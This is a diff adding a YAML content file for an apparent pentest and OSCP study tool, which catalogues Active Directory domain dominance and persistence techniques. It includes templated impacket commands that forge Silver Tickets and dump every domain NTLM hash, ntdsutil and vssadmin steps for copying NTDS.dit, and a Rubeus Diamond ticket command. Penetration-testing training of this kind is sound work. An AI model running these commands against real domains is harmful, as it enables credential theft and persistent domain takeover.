@@ -1,0 +1,191 @@
+# Cephalo content — AD domain dominance & persistence (AD-10).
+# Authorized testing only. Golden Ticket lives in ad/core.yaml; this file adds
+# Silver/Diamond, NTDS extraction, and DC persistence (much of it methodology-only).
+sections:
+  - id: ad.p10.dominance
+    title: AD Domain Dominance & Persistence
+    os: ad
+    phase: persistence
+    order: 132
+    description: Silver/Diamond tickets, NTDS extraction, and durable DC persistence.
+    techniques: [ad.dom.silver, ad.dom.ntds, ad.dom.diamond, ad.dom.persist, ad.dom.goldengmsa]
+    packs: [oscp]
+
+techniques:
+  - id: ad.dom.silver
+    title: Silver Ticket (service account)
+    os: [ad]
+    phase: persistence
+    summary: Forge a service ticket (TGS) from a service account's key — no DC contact.
+    body: |
+      With a service account's NT hash (or AES key) and the domain SID you can forge
+      a TGS for that one service offline. Quieter than a Golden Ticket because the DC
+      is never contacted — but scoped to the single SPN/service.
+    commands: [ad.dom.silver.ticketer]
+    prerequisites: [ad.credaccess.dcsync]
+    tags: [pass-the-ticket, persistence, kerberos]
+    archetypeBand: medium
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.dom.ntds
+    title: NTDS.dit extraction
+    os: [ad]
+    phase: post-exploitation
+    summary: Pull every domain hash from NTDS.dit — over DRSUAPI, IFM, or a VSS copy.
+    body: |
+      The directory database (NTDS.dit) holds every account's hash. Extract it
+      remotely via DRSUAPI (-just-dc), or on a DC via an ntdsutil IFM snapshot or a
+      Volume Shadow Copy, then parse offline.
+    commands: [ad.dom.ntds.secretsdump, ad.dom.ntds.ntdsutil, ad.dom.ntds.vss]
+    prerequisites: [ad.credaccess.dcsync]
+    tags: [dcsync, credential-access, persistence]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.dom.diamond
+    title: Diamond / Sapphire ticket
+    os: [ad]
+    phase: persistence
+    summary: Modify a real TGT in place (stealthier than a forged Golden Ticket).
+    body: |
+      A Diamond ticket decrypts a legitimately-issued TGT with the krbtgt key and
+      re-stamps its PAC, so it survives PAC-validation better than a fully forged
+      ticket. Highly tooling/version-dependent — validate in the target.
+    commands: [ad.dom.diamond.rubeus]
+    tags: [pass-the-ticket, persistence, kerberos]
+    archetypeBand: low
+    references: [ref.rubeus]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.dom.persist
+    title: DC persistence (Skeleton / DSRM / SSP)
+    os: [ad]
+    phase: persistence
+    summary: Methodology-only domain persistence once you fully own the DC.
+    body: |
+      Skeleton Key (patch LSASS to accept a master password), DSRM logon abuse, and
+      a custom Security Support Provider are all DC-resident persistence. EDR- and
+      build-sensitive — methodology + concept only, never a turnkey implant.
+    commands: [ad.dom.persist.skeleton, ad.dom.persist.dsrm]
+    tags: [persistence]
+    archetypeBand: low
+    references: [ref.mimikatz, ref.adsecurity]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.dom.goldengmsa
+    title: Golden gMSA (concept)
+    os: [ad]
+    phase: persistence
+    summary: Recover gMSA key material to compute managed passwords offline (concept).
+    body: |
+      With the KDS root key material an attacker can compute any gMSA's managed
+      password offline and indefinitely — durable persistence. Concept node;
+      applicability and tooling are environment-specific.
+    commands: []
+    tags: [persistence, creds]
+    archetypeBand: low
+    references: [ref.adsecurity]
+    confidence: unverified
+    packs: [oscp]
+
+commands:
+  - id: ad.dom.silver.ticketer
+    title: Forge a Silver Ticket (ticketer)
+    template: "impacket-ticketer -spn '{{SPN}}' -nthash {{NTHASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} Administrator"
+    tool: impacket
+    description: Forge a TGS for the SPN from the service account's NT hash.
+    os: [ad]
+    phase: persistence
+    tags: [pass-the-ticket, kerberos]
+    notes:
+      - "Set KRB5CCNAME to the .ccache, then use -k -no-pass against that service."
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+
+  - id: ad.dom.ntds.secretsdump
+    title: NTDS via DRSUAPI (secretsdump)
+    template: "impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC_IP}} -just-dc-ntlm"
+    tool: impacket
+    description: Replicate all domain NTLM hashes from the DC.
+    os: [ad]
+    phase: post-exploitation
+    tags: [dcsync, credential-access]
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+  - id: ad.dom.ntds.ntdsutil
+    title: NTDS via IFM snapshot (ntdsutil)
+    template: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q"
+    shell: cmd
+    description: On a DC, create an Install-From-Media snapshot of NTDS + SYSTEM.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access]
+    notes:
+      - "Then parse offline: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+    confidence: verified
+    references: [ref.adsecurity]
+    danger: high
+    packs: [oscp]
+  - id: ad.dom.ntds.vss
+    title: NTDS via Volume Shadow Copy
+    template: "vssadmin create shadow /for=C:"
+    shell: cmd
+    description: Snapshot the volume to copy a locked NTDS.dit and SYSTEM hive.
+    os: [ad]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.adsecurity]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.dom.diamond.rubeus
+    title: Diamond ticket (Rubeus)
+    template: "Rubeus.exe diamond /krbkey:{{AESKEY}} /user:{{USER}} /ticketuser:administrator /nowrap"
+    shell: powershell
+    description: Re-stamp a real TGT's PAC using the krbtgt AES key.
+    os: [ad]
+    phase: persistence
+    tags: [pass-the-ticket, kerberos]
+    notes:
+      - "Flags/behaviour vary by build — verify against the target before relying on it."
+    confidence: unverified
+    references: [ref.rubeus]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.dom.persist.skeleton
+    title: Skeleton Key (pointer)
+    template: "# mimikatz misc::skeleton patches LSASS on the DC to accept a master password (EDR-sensitive, methodology)"
+    shell: text
+    description: Concept-level DC persistence via an in-memory LSASS patch.
+    os: [ad]
+    phase: persistence
+    tags: [persistence]
+    confidence: unverified
+    references: [ref.mimikatz]
+    danger: critical
+    packs: [oscp]
+  - id: ad.dom.persist.dsrm
+    title: DSRM logon abuse (pointer)
+    template: "# set DsrmAdminLogonBehavior, then Pass-the-Hash the local DSRM admin account"
+    shell: text
+    description: Reuse the DC's recovery-mode admin as network persistence.
+    os: [ad]
+    phase: persistence
+    tags: [persistence, pass-the-hash]
+    confidence: unverified
+    references: [ref.adsecurity]
+    danger: high
+    packs: [oscp]
